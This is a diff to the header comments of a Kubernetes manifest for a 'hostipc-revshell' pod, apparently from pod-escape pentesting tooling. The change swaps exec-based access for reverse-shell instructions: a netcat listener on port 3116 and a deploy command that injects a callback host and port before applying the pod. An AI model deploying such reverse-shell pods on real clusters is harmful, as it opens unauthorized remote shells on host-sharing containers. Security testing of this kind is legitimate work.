@@ -1,6 +1,6 @@
 ###########################################################
-## Deploy: kubectl -n [namespace] apply -f pod-hostipc-revshell.yaml 
-## Access: kubectl -n [namespace] exec -it pod-hostipc-revshell -- bash
+## Set up Listener: nc -nvlp 3116
+## Deploy: HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/hostipc/pod-hostipc-revshell.yaml | kubectl apply -f -
 ## Remove: kubectl -n [namespace] delete pod-hostipc-revshell
 ###########################################################
 apiVersion: v1
